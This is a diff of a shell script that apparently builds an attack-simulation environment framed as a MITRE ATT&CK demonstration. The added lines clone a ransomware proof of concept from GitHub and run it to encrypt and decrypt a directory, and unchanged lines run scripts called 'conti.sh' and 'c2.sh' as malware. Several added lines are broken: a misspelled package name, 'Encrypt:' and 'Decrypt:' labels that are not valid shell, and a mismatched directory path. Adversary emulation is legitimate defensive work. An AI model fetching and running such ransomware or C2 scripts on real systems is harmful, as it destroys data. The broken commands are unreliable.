@@ -13,6 +13,8 @@ apk add socat
 echo "[+] Adding script exectuion enviorments"
 apk add busybox-extras 
 apk add bash 
+apk add python3 
+apk add py3-pip
 # binairy compilers 
 echo "[+] Adding Linux Binary Compilers"
 apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
@@ -91,9 +93,13 @@ echo "[+] callin malware executables"
 conti.sh || true 
 c2.sh || true 
 
-# Senario In Progress 
-sh loaderh.sh 
-sh conti.sh
+git clone https://github.com/jimmy-ly00/Ransomware-PoC
+cd /Ransomware-POC 
+pip3 install pycroptodome 
+Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
+Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
+### Ransowmare 
+
 
 # MITRE ATT&CK TTP Demonstration Script
 # === Initial Access and Execution ===
